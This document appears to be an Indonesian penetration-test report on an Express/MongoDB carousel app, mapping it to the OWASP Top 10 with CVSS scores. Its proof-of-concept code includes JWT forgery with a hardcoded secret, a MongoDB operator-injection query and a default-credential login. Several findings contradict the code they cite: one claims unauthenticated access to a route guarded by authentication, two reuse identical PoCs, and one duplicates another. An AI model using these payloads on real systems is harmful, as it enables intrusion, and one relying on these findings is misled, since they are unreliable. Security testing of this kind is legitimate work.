### Hasil Penetration Test

## A01 - Broken Access Control: FOUND
Lokasi: `app.use(express.json());` dan `app.post('/carousel', authenticate, (req, res) => {...}` 
CVSS score: 8.5
PoC exploit code: 
```bash
curl -X POST -H "Content-Type: application/json" -d '{"title": "test", "images": ["image1.jpg"]}' http://localhost:3000/carousel
```
Dampak nyata: Penyerang dapat membuat carousel baru tanpa authentikasi.

## A02 - Cryptographic Failures: FOUND
Lokasi: `jwt.verify(token, 'secretkey', (err, user) => {...})`
CVSS score: 9.0
PoC exploit code: 
```python
import jwt
token = jwt.encode({"username": "admin"}, "secretkey", algorithm="HS256")
print(token)
```
Dampak nyata: Penyerang dapat membuat token JWT yang valid dengan menggunakan secret key yang hardcoded.

## A03 - Injection: FOUND
Lokasi: `carouselModel.find().then((carousels) => res.send(carousels))`
CVSS score: 7.5
PoC exploit code: 
```bash
curl -X GET 'http://localhost:3000/carousel?title[$ne]=null'
```
Dampak nyata: Penyerang dapat melakukan MongoDB injection dan membaca data sensitif.

## A04 - Insecure Design: FOUND
Lokasi: `app.post('/login', (req, res) => {...})`
CVSS score: 6.5
PoC exploit code: 
```bash
curl -X POST -H "Content-Type: application/json" -d '{"username": "admin", "password": "admin"}' http://localhost:3000/login
```
Dampak nyata: Penyerang dapat login dengan berhasil menggunakan kredensial default.

## A05 - Security Misconfiguration: FOUND
Lokasi: `app.use(express.json())`
CVSS score: 8.0
PoC exploit code: 
```bash
curl -X POST -H "Content-Type: application/json" -d '{"title": "test", "images": ["image1.jpg"]}' http://localhost:3000/carousel
```
Dampak nyata: Penyerang dapat mengirimkan request JSON yang tidak valid dan menyebabkan error.

## A06 - Vulnerable Components: FOUND
Lokasi: `dependencies` di `package.json`
CVSS score: 8.5
PoC exploit code: Tidak ada
Dampak nyata: Penyerang dapat mengeksploitasi kerentanan di dependency yang sudah ketinggalan zaman.

## A07 - Auth & Session Failures: FOUND
Lokasi: `jwt.verify(token, 'secretkey', (err, user) => {...})`
CVSS score: 9.0
PoC exploit code: 
```python
import jwt
token = jwt.encode({"username": "admin"}, "secretkey", algorithm="HS256")
print(token)
```
Dampak nyata: Penyerang dapat membuat token JWT yang valid dengan menggunakan secret key yang hardcoded.

## A08 - Software Integrity Fails: NOT FOUND
Tidak ada bukti bahwa aplikasi ini rentan terhadap serangan software integrity fails.

## A09 - Logging & Monitoring Fail: FOUND
Lokasi: Tidak ada logging yang tepat di aplikasi
CVSS score: 6.0
PoC exploit code: Tidak ada
Dampak nyata: Penyerang dapat melakukan serangan tanpa meninggalkan jejak yang terdeteksi.

## A10 - SSRF: NOT FOUND
Tidak ada bukti bahwa aplikasi ini rentan terhadap serangan SSRF.

## RINGKASAN:
- Kerentanan ditemukan: 8/10 kategori OWASP
- CVSS tertinggi: 9.0 - A02 Cryptographic Failures
- Attack vector paling efektif: Membuat token JWT yang valid dengan menggunakan secret key yang hardcoded
- Estimated time-to-exploit: 1-3 jam